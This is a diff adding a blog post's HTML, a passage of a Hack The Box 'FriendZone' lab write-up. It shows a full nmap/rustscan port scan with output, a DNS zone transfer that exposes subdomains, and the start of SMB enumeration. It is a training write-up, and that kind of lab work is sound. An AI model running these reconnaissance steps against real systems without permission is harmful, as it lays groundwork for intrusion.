@@ -1,0 +1,1098 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - FriendZone (Without Metasploit)" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just bloggin cyber security related content." /><meta property="og:description" content="Just bloggin cyber security related content." /><link rel="canonical" href="https://rizemon.github.io/posts/friendzone-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/friendzone-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-23T11:53:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - FriendZone (Without Metasploit)" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/friendzone-htb/"},"description":"Just bloggin cyber security related content.","url":"https://rizemon.github.io/posts/friendzone-htb/","@type":"BlogPosting","headline":"Hack The Box - FriendZone (Without Metasploit)","dateModified":"2021-01-23T11:53:00+08:00","datePublished":"2021-01-23T11:53:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - FriendZone (Without Metasploit) | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end">
+<div class="profile-wrapper text-center">
+<div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a>
+</div>
+<div class="site-title mt-3"> <a href="/">rizemon's blog</a>
+</div>
+<div class="site-subtitle font-italic">Cyber Security Enthusiast.</div>
+</div>
+<ul class="w-100">
+<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a>
+</li>
+</ul>
+<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20%5B'',''%5D.join('@')" aria-label="email" class="order-5"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6"> <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span>
+</div>
+</div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - FriendZone (Without Metasploit)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
+<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span>
+</div></div><div id="main-wrapper">
+<div id="main">
+<div class="row">
+<div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+<h1 data-toc-skip>Hack The Box - FriendZone (Without Metasploit)</h1>
+<div class="post-meta text-muted d-flex flex-column">
+<div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jan 23, 2021, 11:53 AM +0800"> Jan 23, 2021 <i class="unloaded">2021-01-23T11:53:00+08:00</i> </span> by <span class="author"> rizemon </span>
+</div>
+<div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3087 words">17 min</span>
+</div>
+</div>
+<div class="post-content">
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone.png" alt="" height="414px" width="615px"></p>
+<h1 id="configuration">Configuration</h1>
+<p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p>
+<p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.123 friendzone.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">--accessible</span> <span class="nt">-a</span> friendzone.htb <span class="nt">-r</span> 1-65535 <span class="nt">--</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span>
+File limit higher than batch size. Can increase speed by increasing batch size <span class="s1">'-b 1048476'</span><span class="nb">.</span>
+Open 10.10.10.123:21
+Open 10.10.10.123:22
+Open 10.10.10.123:53
+Open 10.10.10.123:80
+Open 10.10.10.123:139
+Open 10.10.10.123:443
+Open 10.10.10.123:445
+Starting Script<span class="o">(</span>s<span class="o">)</span>
+Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>
+
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-20 16:35 UTC
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:35
+Completed NSE at 16:35, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:35
+Completed NSE at 16:35, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:35
+Completed NSE at 16:35, 0.00s elapsed
+Initiating Connect Scan at 16:35
+Scanning friendzone.htb <span class="o">(</span>10.10.10.123<span class="o">)</span> <span class="o">[</span>7 ports]
+Discovered open port 445/tcp on 10.10.10.123
+Discovered open port 139/tcp on 10.10.10.123
+Discovered open port 22/tcp on 10.10.10.123
+Discovered open port 80/tcp on 10.10.10.123
+Discovered open port 53/tcp on 10.10.10.123
+Discovered open port 443/tcp on 10.10.10.123
+Discovered open port 21/tcp on 10.10.10.123
+Completed Connect Scan at 16:35, 0.01s elapsed <span class="o">(</span>7 total ports<span class="o">)</span>
+Initiating Service scan at 16:35
+Scanning 7 services on friendzone.htb <span class="o">(</span>10.10.10.123<span class="o">)</span>
+Completed Service scan at 16:36, 12.08s elapsed <span class="o">(</span>7 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.10.123.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 8.17s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 0.13s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 0.00s elapsed
+Nmap scan report <span class="k">for </span>friendzone.htb <span class="o">(</span>10.10.10.123<span class="o">)</span>
+Host is up, received user-set <span class="o">(</span>0.0061s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-01-20 16:35:48 UTC <span class="k">for </span>20s
+
+PORT    STATE SERVICE     REASON  VERSION
+21/tcp  open  ftp         syn-ack vsftpd 3.0.3
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4/mXYmkhp2syUwYpiTjyUAVgrXhoAJ3eEP/Ch7omJh1jPHn3RQOxqvy9w4M6mTbBezspBS+hu29tO2vZBubheKRKa/POdV5Nk+A+q3BzhYWPQA+A+XTpWs3biNgI/4pPAbNDvvts+1ti+sAv47wYdp7mQysDzzqtpWxjGMW7I1SiaZncoV9L+62i+SmYugwHM0RjPt0HHor32+ZDL0hed9p2ebczZYC54RzpnD0E/qO3EE2ZI4pc7jqf/bZypnJcAFpmHNYBUYzyd7l6fsEEmvJ5EZFatcr0xzFDHRjvGz/44pekQ40ximmRqMfHy1bs2j+e39NmsNSp6kAZmNIsx
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOPI7HKY4YZ5NIzPESPIcP0tdhwt4NRep9aUbBKGmOheJuahFQmIcbGGrc+DZ5hTyGDrvlFzAZJ8coDDUKlHBjo<span class="o">=</span>
+|   256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+FZS11nYcVyJgJiLrTYTIy3ia5QvE3+5898MfMtGQl
+53/tcp  open  domain      syn-ack ISC BIND 9.11.3-1ubuntu1.2 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        syn-ack Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+443/tcp open  ssl/http    syn-ack Apache httpd 2.4.29
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 404 Not Found
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>friendzone.red/organizationName<span class="o">=</span>CODERED/stateOrProvinceName<span class="o">=</span>CODERED/countryName<span class="o">=</span>JO/emailAddress<span class="o">=</span>haha@friendzone.red/organizationalUnitName<span class="o">=</span>CODERED/localityName<span class="o">=</span>AMMAN
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>friendzone.red/organizationName<span class="o">=</span>CODERED/stateOrProvinceName<span class="o">=</span>CODERED/countryName<span class="o">=</span>JO/emailAddress<span class="o">=</span>haha@friendzone.red/organizationalUnitName<span class="o">=</span>CODERED/localityName<span class="o">=</span>AMMAN
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2018-10-05T21:02:30
+| Not valid after:  2018-11-04T21:02:30
+| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
+| SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD
+| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV
+| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv
+| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4
+| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD
+| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ
+| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq
+| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA
+| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8
+| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH
+| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
+| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh
+| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q
+| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
+| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
+| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
+| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
+| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
+| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
+| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
+| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
+| fv9s+GxKNvsBqDBX
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: Hosts: FRIENDZONE, 127.0.0.1<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-40m00s</span>, deviation: 1h09m16s, median: 0s
+| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   FRIENDZONE&lt;00&gt;       Flags: &lt;unique&gt;&lt;active&gt;
+|   FRIENDZONE&lt;03&gt;       Flags: &lt;unique&gt;&lt;active&gt;
+|   FRIENDZONE&lt;20&gt;       Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 60332/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 31929/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 11328/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 37865/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6-Ubuntu<span class="o">)</span>
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: friendzone
+|_  System <span class="nb">time</span>: 2021-01-20T18:36:00+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-01-20T16:36:00
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 16:36
+Completed NSE at 16:36, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.87 seconds
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="enumeration-1">Enumeration (1)</h1>
+<h2 id="port-80-apache-httpd-2429-ubuntu">Port 80 <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.29 ((Ubuntu))</code>
+</h2>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/friendzone1.png" alt=""></p>
+<p>Looking at the email they provided, we see the domain <code class="language-plaintext highlighter-rouge">friendzoneportal.red</code>. After adding it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, we then browsed to <code class="language-plaintext highlighter-rouge">http://friendzoneportal.red</code> but unfortunately we were provided with the same picture.</p>
+<h2 id="port-53-isc-bind-9113-1ubuntu12-ubuntu-linux">Port 53 <code class="language-plaintext highlighter-rouge">ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</code>
+</h2>
+<p>Lets attempt to perform a zone transfer for the <code class="language-plaintext highlighter-rouge">friendzoneportal.red</code> domain.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>host <span class="nt">-t</span> axfr friendzoneportal.red friendzone.htb
+Trying <span class="s2">"friendzoneportal.red"</span>
+Using domain server:
+Name: friendzone.htb
+Address: 10.10.10.123#53
+Aliases: 
+
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 31060
+;; flags: qr aa; QUERY: 1, ANSWER: 9, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;friendzoneportal.red.          IN      AXFR
+
+;; ANSWER SECTION:
+friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzoneportal.red.   604800  IN      AAAA    ::1
+friendzoneportal.red.   604800  IN      NS      localhost.
+friendzoneportal.red.   604800  IN      A       127.0.0.1
+admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
+files.friendzoneportal.red. 604800 IN   A       127.0.0.1
+imports.friendzoneportal.red. 604800 IN A       127.0.0.1
+vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
+friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>We see 4 new subdomains so lets add them to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+10.10.10.123 friendzone.htb friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
+...
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>I didn’t discover anything new from browsing via the new subdomains we found so let’s move on.</p>
+<h2 id="port-445-samba-smbd-476-ubuntu-workgroup-workgroup">Port 445 <code class="language-plaintext highlighter-rouge">Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</code>
+</h2>
+<p>Lets see what shares we can access.</p>
